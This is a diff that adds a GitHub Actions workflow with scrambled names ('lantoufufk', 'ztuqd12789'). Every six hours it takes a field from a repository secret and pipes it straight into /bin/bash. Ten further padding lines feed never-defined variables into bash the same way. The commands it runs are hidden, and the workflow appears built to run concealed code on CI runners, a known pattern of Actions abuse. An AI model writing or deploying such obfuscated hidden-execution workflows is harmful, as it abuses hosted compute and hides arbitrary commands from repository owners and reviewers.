@@ -1,0 +1,27 @@
+name: lantoufufk
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lantoufufk
+        env:
+          ztuqd12789: ${{ secrets.ztuqd12789 }}
+        run: |
+          echo $ztuqd12789 | jq -r .the726 | /bin/bash
+          echo $vx04 | jq -r .cmkw37711 | /bin/bash
+          echo $ltid356 | jq -r .kgpzo87098 | /bin/bash
+          echo $d6 | jq -r .ndvb2256 | /bin/bash
+          echo $qne33 | jq -r .hbza51201 | /bin/bash
+          echo $fpf122 | jq -r .q7 | /bin/bash
+          echo $lbee90055 | jq -r .ctzct7629 | /bin/bash
+          echo $bwbv438 | jq -r .dyl5875 | /bin/bash
+          echo $fd858 | jq -r .zzlh9 | /bin/bash
+          echo $rfo050 | jq -r .pa43 | /bin/bash
+          echo $ta344 | jq -r .sah8541 | /bin/bash
+
